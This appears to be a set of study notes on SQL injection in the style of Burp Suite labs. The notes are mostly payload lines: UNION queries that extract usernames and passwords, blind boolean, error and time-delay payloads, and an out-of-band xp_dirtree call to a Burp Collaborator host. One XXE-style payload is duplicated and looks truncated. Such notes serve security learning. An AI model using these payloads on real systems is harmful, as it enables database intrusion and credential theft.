# SQL Injection

### Detect SQL Injection Vulnerabilities&#x20;

* Submit `'`&#x20;
* SQL-specific syntax(ASCII(97)), `OR 1=1`
* Trigger time delays, OAST payloads to trigger out-of-band interaction&#x20;

### Second-Order SQL injection&#x20;

* First-order SQL injection arises where the application takes user input from an HTTP request&#x20;
* Second-order (stored SQLi), takes user input from an HTTP request and stores it for future use.
* The DB when fetching from stored values might not perform any additional sanitization and the attacker will be able to see output in another page.
* Payload injected in a particular HTTP Request, but the effect is not visible in the same response but somewhere else within the application where this query is processed and details are retrieved.&#x20;

### Retrieving Hidden Data&#x20;

* Use comments syntax to change the logic ('--)&#x20;
* Use `' OR 1=1--`, `'+OR+1=1--`

### &#x20;Subverting Application Logic&#x20;

* In case of username and password -> changing logic to only check the username and ignore the password&#x20;

### Retrieving Data from other Database Tables&#x20;

* Use `UNION` keyword&#x20;
* UNION Attacks - retrieve data from other tables -> appends one or more queries to original query&#x20;

#### Requirements&#x20;

* Individual queries must have the same number of columns&#x20;
* Data types in each column must be compatible&#x20;

### Determine the Number of Columns being Displayed using `ORDER BY`&#x20;

* `'+ORDER+BY+1--`&#x20;
* `'+UNION+SELECT+NULL,NULL--` (append more `NULL` if required)&#x20;
* Reason for using NULL is because it should be compatible with the data types&#x20;

### Determine the Data Type of Column&#x20;

* `'+UNION+SELECT+'A',NULL,NULL--`
* Keep changing the position of string and Increase or decrease NULL values

### Retrieving Multiple Values within Single Column&#x20;

* Retrieve multiple values within this single column by concatenating the values together
* `'+UNION+SELECT+username+||+'~'+||+password+FROM+users--`&#x20;
* eg: oracle database uses `||` for string concatenation -> change accordingly&#x20;

### Examining Database Details&#x20;

* Depending on DB version query changes&#x20;
* For Oracle - requires `FROM` keyword as a must
* Use Burp SQL injection cheat sheet

### Blind SQL Injection Detection&#x20;

* Trigger a detectable difference in the application's response depending on the true/false of a single condition.&#x20;
* Trigger a time delay in the processing of the query&#x20;
* Trigger an out-of-band network interaction, using OAST techniques.&#x20;

### Exploiting Blind SQL Injection by Triggering Conditional Responses

* Works only if there is some kind of difference in the response
* eg: trackingID cookie&#x20;
* `xyz' AND '1'='1 , xyz' AND '1'='2`&#x20;
* `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`&#x20;
* `SUBSTRING` method used is different depending on DB version&#x20;
* make use of `length()` and `substring()`
* In intruder there is an option grep-match - provide the difference in response message&#x20;

### Exploiting Blind SQL Injection by  Inducing Conditional Responses by Triggering SQL Errors&#x20;

* Works only if error handling mechanism is not defined
* `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`&#x20;
* `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`&#x20;
* Here if the condition is true it will throw an error for division by zero&#x20;
* use `substring()` and `length()` to know about the details that is to be fetched&#x20;
* In intruder look for 500 status code&#x20;

### Exploiting Blind SQL Injection by Triggering Time Delays&#x20;

* If error handling mechanism is defined
* Triggering time delays conditionally, depending on an injected condition&#x20;
* `'; IF (1=2) WAITFOR DELAY '0:0:10'--`&#x20;
* `'; IF (1=1) WAITFOR DELAY '0:0:10'--` (triggers a delay of 10 seconds)&#x20;
* Time delay function varies depending on DB version
* In resource pool change max concurrent requests to 1 and in results -> column -> response received/completed -> look for the number matching the time delay&#x20;

### Exploiting Blind SQL Injection using Out-of-Band (OAST) techniques

* When SQL queries are not executed synchronously
* Make use of burp collaborator&#x20;
* Cmd varies according to version of DB&#x20;
* If sql query is executed asynchronously -> use this method&#x20;
* `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`&#x20;
* `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual--`&#x20;
* `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual--`&#x20;

### Bypass WAF using Hackvertor&#x20;

* Encode -> dec\_entities/hex\_entities
